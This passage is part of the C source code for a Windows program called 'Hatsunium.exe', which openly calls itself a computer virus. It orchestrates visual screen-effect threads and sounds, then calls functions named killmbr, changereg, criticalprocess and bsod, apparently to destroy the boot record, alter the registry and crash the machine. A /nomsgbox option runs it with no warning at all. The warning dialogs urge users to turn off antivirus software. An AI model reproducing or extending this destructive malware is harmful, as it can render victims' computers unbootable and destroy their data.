			HANDLE thread21 = CreateThread(0, 0, melt2, 0, 0, 0);
			HANDLE thread22 = CreateThread(0, 0, drawinverseproportionalfunctionicon, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			refreshscr();
			sound12();
			HANDLE thread23 = CreateThread(0, 0, melt3, 0, 0, 0);
			HANDLE thread24 = CreateThread(0, 0, drawtancotfunctionicon, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			TerminateThread(thread24, 0);
			CloseHandle(thread24);
			refreshscr();
			sound13();
			HANDLE thread25 = CreateThread(0, 0, ttrraaiinn, 0, 0, 0);
			HANDLE thread26 = CreateThread(0, 0, text2, 0, 0, 0);
			HANDLE thread27 = CreateThread(0, 0, anything, 0, 0, 0);
			HANDLE thread28 = CreateThread(0, 0, drawmikuicon, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread25, 0);
			CloseHandle(thread25);
			refreshscr();
			sound14();
			HANDLE thread29 = CreateThread(0, 0, fastmove, 0, 0, 0);
			HANDLE thread30 = CreateThread(0, 0, anyblt, 0, 0, 0);
			HANDLE thread31 = CreateThread(0, 0, anyblt2, 0, 0, 0);
			Sleep(30000);
			refreshscr();
			TerminateThread(thread26, 0);
			CloseHandle(thread26);
			TerminateThread(thread29, 0);
			CloseHandle(thread29);
			refreshscr();
			sound15();
			HANDLE thread12 = CreateThread(0, 0, silie2, 0, 0, 0);
			HANDLE thread32 = CreateThread(0, 0, fastdown, 0, 0, 0);
			HANDLE thread33 = CreateThread(0, 0, text3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread32, 0);
			CloseHandle(thread32);
			refreshscr();
			sound16();
			HANDLE thread34 = CreateThread(0, 0, crushscr, 0, 0, 0);
			HANDLE thread35 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread27, 0);
			CloseHandle(thread27);
			TerminateThread(thread30, 0);
			CloseHandle(thread30);
			TerminateThread(thread31, 0);
			CloseHandle(thread31);
			TerminateThread(thread34, 0);
			CloseHandle(thread34);
			TerminateThread(thread35, 0);
			CloseHandle(thread35);
			refreshscr();
			sound17();
			HANDLE thread36 = CreateThread(0, 0, cosinescreen, 0, 0, 0);
			HANDLE thread37 = CreateThread(0, 0, cosinescreen2, 0, 0, 0);
			HANDLE thread38 = CreateThread(0, 0, pixel10proxl, 0, 0, 0);
			HANDLE thread39 = CreateThread(0, 0, text4, 0, 0, 0);
			HANDLE thread40 = CreateThread(0, 0, drawmikucur, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread36, 0);
			CloseHandle(thread36);
			TerminateThread(thread37, 0);
			CloseHandle(thread37);
			refreshscr();
			sound18();
			HANDLE thread41 = CreateThread(0, 0, profect, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread33, 0);
			CloseHandle(thread33);
			TerminateThread(thread41, 0);
			CloseHandle(thread41);
			refreshscr();
			sound19();
			HANDLE thread42 = CreateThread(0, 0, shader8, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread38, 0);
			CloseHandle(thread38);
			TerminateThread(thread39, 0);
			CloseHandle(thread39);
			TerminateThread(thread42, 0);
			CloseHandle(thread42);
			refreshscr();
			sound20();
			HANDLE thread43 = CreateThread(0, 0, shader9, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread28, 0);
			CloseHandle(thread28);
			TerminateThread(thread40, 0);
			CloseHandle(thread40);
			TerminateThread(thread43, 0);
			CloseHandle(thread43);
			refreshscr();
			return 0;
		}
		else if (!lstrcmpW(argv[1], L"/easteregg")) {
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "You found the easter egg!", "Hatsunium.exe", MB_OK | MB_ICONINFORMATION) == IDOK) {
				UnhookWindowsHookEx(hMsgHookA);
				eggwin(NULL, NULL, NULL, NULL);
			}
			else {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
		}
		else if (!lstrcmpW(argv[1], L"/about")) {
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			aboutmsg();
			UnhookWindowsHookEx(hMsgHookA);
		}
		else if (!lstrcmpW(argv[1], L"/?")) {
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "Usage: [The program name] [Arguments name]\r\n\r\nArguments:\r\n/about    Displaying \"About Hatsunium.exe\" window.\r\n/help    Displaying help window (This window).\r\n/msgbox    Running main program with warning messageboxes (Default).\r\n/nomsgbox    Running main program without warning messageboxes.\r\n/?    Displaying help window (This window).", "Hatsunium.exe", MB_OK | MB_ICONINFORMATION) == IDOK) {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
			else {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
		}
		else if (!lstrcmpW(argv[1], L"/help")) {
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "Usage: [The program name] [Arguments name]\r\n\r\nArguments:\r\n/about    Displaying \"About Hatsunium.exe\" window.\r\n/help    Displaying help window (This window).\r\n/msgbox    Running main program with warning messageboxes (Default).\r\n/nomsgbox    Running main program without warning messageboxes.\r\n/?    Displaying help window (This window).", "Hatsunium.exe", MB_OK | MB_ICONINFORMATION) == IDOK) {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
			else {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
		}
		else if (!lstrcmpW(argv[1], L"/msgbox")) {
			char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
			GetModuleFileNameA(NULL, fn, 8192);
			CREATE_NO_WINDOW;
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Hatsunium.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
			else
			{
				UnhookWindowsHookEx(hMsgHookA);
				HHOOK hMsgHookB = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
				if (MessageBoxA(NULL, "This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", "Hatsunium.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
				{
					UnhookWindowsHookEx(hMsgHookB);
					ExitProcess(0);
				}
				else
				{
					UnhookWindowsHookEx(hMsgHookB);
					criticalprocess();
					killmbr();
					changereg();
					ShellExecuteA(NULL, NULL, fn, "/payload1", NULL, SW_SHOWDEFAULT);
					Sleep(60000);
					ShellExecuteA(NULL, NULL, fn, "/payload2", NULL, SW_SHOWDEFAULT);
					Sleep(90000);
					ShellExecuteA(NULL, NULL, fn, "/payload3", NULL, SW_SHOWDEFAULT);
					Sleep(450000);
					killmbr();
					bsod();
					return 0;
				}

			}
		}
		else if (!lstrcmpW(argv[1], L"/nomsgbox")) {
			char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
			GetModuleFileNameA(NULL, fn, 8192);
			criticalprocess();
			killmbr();
			changereg();
			ShellExecuteA(NULL, NULL, fn, "/payload1", NULL, SW_SHOWDEFAULT);
			Sleep(60000);
			ShellExecuteA(NULL, NULL, fn, "/payload2", NULL, SW_SHOWDEFAULT);
			Sleep(90000);
			ShellExecuteA(NULL, NULL, fn, "/payload3", NULL, SW_SHOWDEFAULT);
			Sleep(450000);
			killmbr();
			bsod();
			return 0;
		}
		else {
			HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "Invalid argument! Please use a valid argument and try it again!", "Hatsunium.exe", MB_OK | MB_ICONERROR) == IDOK) {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
			else {
				UnhookWindowsHookEx(hMsgHookA);
				ExitProcess(0);
			}
		}
	}
	else if (argc == 1) {
		char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
		GetModuleFileNameA(NULL, fn, 8192);
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxA(NULL, "Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Hatsunium.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			UnhookWindowsHookEx(hMsgHookA);
			HHOOK hMsgHookB = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
			if (MessageBoxA(NULL, "This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", "Hatsunium.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				UnhookWindowsHookEx(hMsgHookB);
				ExitProcess(0);
			}
			else
			{
				UnhookWindowsHookEx(hMsgHookB);
				criticalprocess();
				killmbr();
				changereg();
				ShellExecuteA(NULL, NULL, fn, "/payload1", NULL, SW_SHOWDEFAULT);
				Sleep(60000);
				ShellExecuteA(NULL, NULL, fn, "/payload2", NULL, SW_SHOWDEFAULT);
				Sleep(90000);
				ShellExecuteA(NULL, NULL, fn, "/payload3", NULL, SW_SHOWDEFAULT);
				Sleep(450000);
				killmbr();
				bsod();
				return 0;
			}

		}
	}
	else {
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxA(NULL, "Invalid argument! Please use a valid argument and try it again!", "Hatsunium.exe", MB_OK | MB_ICONERROR) == IDOK) {
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else {
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
	}
}